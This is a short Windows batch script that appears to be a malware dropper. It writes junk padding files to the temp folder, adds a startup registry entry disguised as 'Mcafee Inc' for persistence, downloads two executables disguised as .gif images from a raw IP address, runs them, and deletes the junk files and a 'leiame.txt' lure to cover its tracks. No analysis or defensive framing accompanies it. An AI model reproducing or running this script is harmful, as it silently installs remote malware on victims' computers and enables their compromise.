@shift
@break off

echo kjfkdsjfkdsjkdjfkdjkdjfkdsjfkdjfdnf48343274893279fhdsjhgfsgb > %temp%\zeros.dat
echo fkjdsfjdksljksjncbnmvxvncbxvmnbcxvmnbcxmvxbcmnvbxmvbxcmnvxbcv > %temp%\zeros1.dat
echo uyreuewprieoyoiruewoiyewuiuriruewoiuryweuryweyrwreyiwyrwyriww > %temp%\zeros2.dat
echo fkjdsfjdksljksjncbnmvxvncbxvmnbcxvmnbcxmvxbcmnvbxmvbxcmnvxbcv >> %temp%\zeros1.dat


set inf=0
set exe="%temp%\mssgnr.exe"
set exe2="%temp%\freecvsup.exe"

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "Mcafee Inc" /t REG_SZ /d %exe2% /f

%temp%\dw.exe http://113.30.103.253/new/studio2.gif "%exe2%"
%temp%\dw.exe http://113.30.103.253/new/studio.gif "%exe%"

del "%temp%\leiame.txt"


cmd.exe /c "%exe2%"
cmd.exe /c "%exe%"

echo fodjfdsifdsjfdsjhfkdshfjkdshfsdhfkjsdhfkjsdfhdsfjk438899re8r > %temp%\zeros3.dat
echo fodjfdsifdsjfdsjhfkdshfjkdshfsdhfkjsdhfkjsdfhdsfjk438899re8r >> %temp%\zeros3.dat
echo fodjfdsifdsjfdsjhfkdshfjkdshfsdhfkjsdhfkjsdfhdsfjk438899re8r >> %temp%\zeros3.dat
echo fodjfdsifdsjfdsjhfkdshfjkdshfsdhfkjsdhfkjsdfhdsfjk438899re8r >> %temp%\zeros3.dat
echo fodjfdsifdsjfdsjhfkdshfjkdshfsdhfkjsdhfkjsdfhdsfjk438899re8r >> %temp%\zeros3.dat
echo fodjfdsifdsjfdsjhfkdshfjkdshfsdhfkjsdhfkjsdfhdsfjk438899re8r >> %temp%\zeros3.dat
echo fodjfdsifdsjfdsjhfkdshfjkdshfsdhfkjsdhfkjsdfhdsfjk438899re8r >> %temp%\zeros3.dat
echo fodjfdsifdsjfdsjhfkdshfjkdshfsdhfkjsdhfkjsdfhdsfjk438899re8r >> %temp%\zeros3.dat

del "%temp%\zeros.dat"
del "%temp%\zeros1.dat"
del "%temp%\zeros2.dat"
del "%temp%\zeros3.dat"


